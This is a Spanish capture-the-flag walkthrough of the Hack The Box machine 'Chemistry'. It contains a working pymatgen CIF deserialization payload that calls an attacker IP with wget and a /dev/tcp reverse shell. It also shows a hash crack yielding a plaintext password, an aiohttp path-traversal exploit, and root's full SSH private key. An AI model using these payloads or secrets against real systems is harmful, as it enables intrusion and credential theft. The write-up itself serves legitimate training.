---
hidden: true
noIndex: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of gzzcoochemistry

<figure><img src="../../.gitbook/assets/Chemistry.png" alt="" width="563"><figcaption></figcaption></figure>

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`Chemistry`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.11.38 -oG allPorts
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 03:30 CET
Nmap scan report for 10.10.11.38
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.38
	[*] Open ports: 22,5000

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página en el puerto 5000 y del servicio SSH expuesto.

```bash
❯ nmap -sCV -p22,5000 10.10.11.38 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-15 03:31 CET
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.11.38
Host is up (0.073s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
|_http-server-header: Werkzeug/3.0.3 Python/3.9.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   79.53 ms 10.10.16.1
2   40.10 ms 10.10.11.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.88 seconds
```

Procederemos a transformar el archivo generado `targetedXML` para transformar el `XML` en un archivo `HTML` para posteriormente montar un servidor web y visualizarlo.

```bash
❯ xsltproc targetedXML > index.html

❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.

<figure><img src="../../.gitbook/assets/3582_vmware_YDssIM3F8m.png" alt=""><figcaption></figcaption></figure>

## Web Enumeration

Procederemos a acceder al sitio web [http://10.10.11.38:5000/](http://10.10.11.38:5000/), verificamos que es una página web que actúa como herramienta para analizar los archivos `CIF` (Crystallographic Information File) que sean subidos.

Tambiñen verificamos que disponemos de las opciones para iniciar sesión o registrarnos como usuario.

{% hint style="info" %}
Un archivo CIF (Crystallographic Information File) es un formato de archivo de texto estándar para representar información cristalográfica, promulgado por la Unión Internacional de Cristalografía (IUCr).
{% endhint %}

<figure><img src="../../.gitbook/assets/3583_vmware_pcyE3uhQVG.png" alt="" width="563"><figcaption></figcaption></figure>

Procederemos a acceder a la página de [http://10.10.11.38:5000/register](http://10.10.11.38:5000/register) y procederemos a intentar registrarnos en el sitio web.

<figure><img src="../../.gitbook/assets/imagen (154).png" alt="" width="339"><figcaption></figcaption></figure>

Revisaremos que somos redirigidos a la página [http://10.10.11.38:5000/dashboard/](http://10.10.11.38:5000/dashboard/), la cual verificamos que podemos subir un archivo `CIF`, además nos proporcionan un ejemplo de la estructura de un archivo `CIF`.&#x20;

Procederemos a descargarnos el archivo `CIF` para analizar la estructura de este mismo.

<figure><img src="../../.gitbook/assets/imagen (155).png" alt="" width="563"><figcaption></figcaption></figure>

Al verificar el contenido del archivo de ejemplo recién descargado, verificaremos la estructura de este mismo.

```bash
❯ cat example.cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

Procederemos a subir el archivo de ejemplo `example.cif` y verificamos que nos aparecen las opciones (View, Delete). Procederemos a visualizar el archivo `CIF` subido.

<figure><img src="../../.gitbook/assets/imagen (88).png" alt="" width="563"><figcaption></figcaption></figure>

Verificamos que nos reddirige al siguiente resultado. Por lo que podemos apreciar, al parecer lo que ocurre por detrás de la herramienta es la deserialización de los datos para ser posteriormente mostrados en el siguiente resultado.

<figure><img src="../../.gitbook/assets/imagen (89).png" alt="" width="554"><figcaption></figcaption></figure>

### Arbitrary Code Execution in Pymatgen via Insecure Deserialization (CVE-2024-23346) \[RCE]

Realizando una investigación sobre posibles vulnerabilidades para crear archivos `CIFs`maliciosos, nos encontramos con el siguiente CVE.

{% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-23346" %}

{% hint style="danger" %}
Pymatgen (Python Materials Genomics) es una librería Python de código abierto para análisis de materiales. Existe una vulnerabilidad de seguridad crítica en el método JonesFaithfulTransformation.from\_transformation\_str() dentro de la librería pymatgen antes de la versión 2024.2.20.

Este método utiliza de forma insegura eval() para procesar la entrada, lo que permite la ejecución de código arbitrario al analizar entradas que no son de confianza. La versión 2024.2.20 soluciona este problema.
{% endhint %}

También encontramos con el siguiente repositorio de GitHub que nos muestra un ejemplo de un archivo `CIF` malicioso que permite la ejecución de comandos remotos.

{% embed url="https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f" %}

En este ejemplo, para probar que la vulnerabilidad existe y podemos aprovecharnos de ella, lo que realizaremos es que haga una solicitud con la herramienta `wget` a nuestro servidor web que montaremos posteriormente y haga una llamada a un archivo que no existe. Esto con el objetivo de verificar si recibimos en nuestro servidor web la solicitud que realiza el equipo víctima a nuestro servidor.

```bash
❯ catnp test.cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("wget 10.10.16.5/test");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Procederemos a subir al sitio web el archivo `CIF` malicioso.

<figure><img src="../../.gitbook/assets/3586_vmware_DCQQJ3kRqt.png" alt=""><figcaption></figcaption></figure>

Antes de visualizar el contenido del archivo malicioso, nos levantaremos un servidor web con Python.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Procederemos a visualizar el archivo malicioso subido para revisar si se ejecuta el comando arbitrario.

<figure><img src="../../.gitbook/assets/imagen (156).png" alt=""><figcaption></figcaption></figure>

En nuestro servidor web, verificamos que se ha recibido una solicitud `GET` desde el equipo víctima. Esto nos acaba confirmando de que podemos lograr ejecutar comandos remotos en la máquina víctima.

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.38 - - [15/Jan/2025 03:42:43] code 404, message File not found
10.10.11.38 - - [15/Jan/2025 03:42:43] "GET /test HTTP/1.1" 404 -
```

Sabiendo esto, nuestro objetivo será intentar ganar acceso a través de una Reverse Shell al equipo víctima.

```bash
❯ cat test.cif
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.16.5/443 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Nos pondremos en escucha por un puerto, subiremos nuevamente el nuevo archivo `CIF` malicioso y al visualizarlo desde la página web, verificaremos que hemos recibido el acceso a la máquina víctima correctamente.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.5] from (UNKNOWN) [10.10.11.38] 36714
sh: 0: can't access tty; job control turned off
$ hostname
chemistry
$ whoami
adminapp
```

## Initial Access

### Confidential information exposed in a DB file

Revisando el directorio en el cual nos encontramos actualmente con el usuario `adminapp`, revisamos que existe un archivo de una base de datos.

Al verificar el contenido de la base de datos, nos encontramos con usuarios y lo que parecen ser contraseñas en formato hash.&#x20;

```bash
adminapp@chemistry:~/instance$ cat database.db 
�f�K�ytableuseruserCREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(150) NOT NULL,
        password VARCHAR(150) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username)
)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
        id INTEGER NOT NULL,
        user_id INTEGER NOT NULL,
        filename VARCHAR(150) NOT NULL,
        identifier VARCHAR(100) NOT NULL,
        PRIMARY KEY (id),
        FOREIGN KEY(user_id) REFERENCES user (id),
        UNIQUE (identifier)
����42Utest.cifd0c31e9e-b720-4eec-8a50-929380e381e3
Maxel9347f9724ca083b17e39555c36fd9007*e381e3 kristel6896ba7b11a62cacffbdaded457c6d92(
eusebio6cad48078d0241cca9a7b322ecd073b3)abian4e5Mtaniaa4aa55e816205dc0389591c9f82f43bbMvictoriac3601ad2286a4293868ec2a4bc606ba3)Mpeter6845c17d298d95aa942127bdad2ceb9b*Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*Mjobert3dec299e06f7ed187bac06bd3b670ab2*Mrobert02fcf7cfc10adc37959fb21f06c6b467(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)Madmin2861debaf8d99436a10ed6f75a252abf
a��x����a�l�����__�
gzzcoo
kristeaxel
fabian
gelacia
eusebio
tania	
victoriapeter
carlos
jobert
roberrosaapp
```

### Cracking hashes

Procederemos a crackear los hashes obtenidos, y verificamos que logramos crackear el hash del usuario `rosa` y obtenemos sus credenciales en texto plano.

```bash
❯ hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
...[snip]...
63ed86ee9f624c7b14f1d4f43dc251a5:unicorniosrosados
...[snip]...
```

Desde la consola que ya disponemos acceso, procederemos a migrar al usuario `rosa` accediendo con las credenciales obtenidas, verificamos que ganamos del acceso correctamente.

```bash
adminapp@chemistry:~/instance$ su rosa
Password: 

rosa@chemistry:/home/app/instance$ whoami
rosa
```

También verificamos que hemos ganado el acceso a la flag de **user.txt**

```bash
rosa@chemistry:~$ pwd
/home/rosa

rosa@chemistry:~$ cat user.txt 
a65886ac7ef2********************
```

## Privilege Escalation

### Exploitaition Path Traversal (CVE-2024-23334)

Reviasndo los puertos que se encuentran abiertos en la máquina, verificamos que hay un proceso llamado `localhost:http-alt`.

{% hint style="info" %}
Puerto 8080 (TCP): alternativa HTTP (http\_alt) comúnmente utilizada para servidores proxy web y de almacenamiento en caché, o para ejecutar un servidor web como un usuario no root.
{% endhint %}

```bash
rosa@chemistry:~$ netstat -l
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN     
tcp        0      0 localhost:http-alt      0.0.0.0:*               LISTEN     
tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN     
tcp6       0      0 [::]:ssh                [::]:*                  LISTEN     
udp        0      0 localhost:domain        0.0.0.0:*                          
udp        0      0 0.0.0.0:bootpc          0.0.0.0:*                      
```

Al realizar un `cURL` al sitio web, verificamos que recibimos la respuesta por parte del servidor de lo que parece ser una web activa.

```bash
rosa@chemistry:~$ curl localhost:8080
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site Monitoring</title>
    <link rel="stylesheet" href="/assets/css/all.min.css">
    <script src="/assets/js/jquery-3.6.0.min.js"></script>
    <script src="/assets/js/chart.js"></script>
    <link rel="stylesheet" href="/assets/css/style.css">
    <style>
    h2 {
      color: black;
      font-style: italic;
    }


    </style>
</head>
<body>
    <nav class="navbar">
        <div class="container">
            <h1 class="logo"><i class="fas fa-chart-line"></i> Site Monitoring</h1>
            <ul class="nav-links">
                <li><a href="#" id="home"><i class="fas fa-home"></i> Home</a></li>
                <li><a href="#" id="start-service"><i class="fas fa-play"></i> Start Service</a></li>
                <li><a href="#" id="stop-service"><i class="fas fa-stop"></i> Stop Service</a></li>
                <li><a href="#" id="list-services"><i class="fas fa-list"></i> List Services</a></li>
                <li><a href="#" id="check-attacks"><i class="fas fa-exclamation-triangle"></i> Check Attacks</a></li>
            </ul>
        </div>
    </nav>
...[snip]...
```

Revisaremos las cabeceras del sitio web en busca de información interesante. Entre la información encontrada, verificamos que utiliza `aiohttp/3.9.1`.

```bash
rosa@chemistry:~$ curl localhost:8080 --head
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 5971
Date: Wed, 15 Jan 2025 03:31:00 GMT
Server: Python/3.9 aiohttp/3.9.1
```

Realizando una búsqueda sobre posibles vulnerabilidades de la versión del servidor, nos encontramos con el siguiente `CVE-2024-23334`.

{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-23334" %}

{% hint style="danger" %}
aiohttp es un framework cliente/servidor HTTP asíncrono para asyncio y Python. Cuando se utiliza aiohttp como servidor web y se configuran rutas estáticas, es necesario especificar la ruta raíz para los archivos estáticos. Además, la opción 'follow\_symlinks' se puede utilizar para determinar si se deben seguir enlaces simbólicos fuera del directorio raíz estático.

Cuando 'follow\_symlinks' se establece en Verdadero, no hay validación para verificar si la lectura de un archivo está dentro del directorio raíz. Esto puede generar vulnerabilidades de directory traversal, lo que resulta en acceso no autorizado a archivos arbitrarios en el sistema, incluso cuando no hay enlaces simbólicos presentes.&#x20;

Se recomiendan como mitigaciones deshabilitar follow\_symlinks y usar un proxy inverso. La versión 3.9.2 soluciona este problema.
{% endhint %}

También nos encontramos con el siguiente repositorio que nos muestra un PoC (Proof of concept) de la explotación de esta vulnerabilidad de Path Traversal. Realizando la explotación, verificamos que hemos logrado obtener directamente la flag de **root.txt**.

{% hint style="warning" %}
En nuestro caso, deberemos de modificar el exploit original para que utilice el puerto 8080 y no el que viene por defecto que es el 8081.
{% endhint %}

{% embed url="https://github.com/Arc4he/CVE-2024-23334-PoC/tree/main" %}

```bash
rosa@chemistry:~$ cat exploit.py | grep localhost
    url = "http://localhost:8080/assets/"
    
rosa@chemistry:~$ chmod +x exploit.py 

rosa@chemistry:~$ ./exploit.py 
Sending payloads...
Round 1: http://localhost:8080/assets/../root/root.txt
Round 2: http://localhost:8080/assets/../../root/root.txt
Round 3: http://localhost:8080/assets/../../../root/root.txt
[+] Success! File found.
HTTP/1.1 200 OK
Content-Type: text/plain
Etag: "181abcea3a49356f-21"
Last-Modified: Wed, 15 Jan 2025 02:32:01 GMT
Content-Length: 33
Accept-Ranges: bytes
Date: Wed, 15 Jan 2025 03:42:58 GMT
Server: Python/3.9 aiohttp/3.9.1

0c7f9ccbed3a657*****************
```

Modificaremos el script original para que lea en este caso, el archivo `/root/.ssh/id_rsa` y así lograr obtener la clave privada del usuario `root` y conectarnos posteriormente por `SS.`

Volvemos a ejeuctar el exploit y verificamos que logramos visualizar el contenido correctamente.

```bash
rosa@chemistry:~$ ./exploit.sh 
Sending payloads...
Round 1: http://localhost:8080/assets/../root/.ssh/id_rsa
Round 2: http://localhost:8080/assets/../../root/.ssh/id_rsa
Round 3: http://localhost:8080/assets/../../../root/.ssh/id_rsa
[+] Success! File found.
HTTP/1.1 200 OK
Content-Type: application/octet-stream
Etag: "17d9a4c79c30680c-a2a"
Last-Modified: Mon, 17 Jun 2024 00:58:31 GMT
Content-Length: 2602
Accept-Ranges: bytes
Date: Thu, 16 Jan 2025 05:31:20 GMT
Server: Python/3.9 aiohttp/3.9.1

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Copiaremos la clave privada del usuario `root` en nuestro equipo local, le daremos los permisos correspondientes y procederemos a autenticarnos al equipo víctima con el usuario `root` haciendo uso de su clave privada.

```bash
❯ chmod 600 id_rsa
❯ ssh -i id_rsa root@10.10.11.38
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-196-generic x86_64)
...[snip]...

Last login: Thu Jan 16 05:47:26 2025 from 10.10.16.5
root@chemistry:~# hostname
chemistry
root@chemistry:~# whoami
root
```
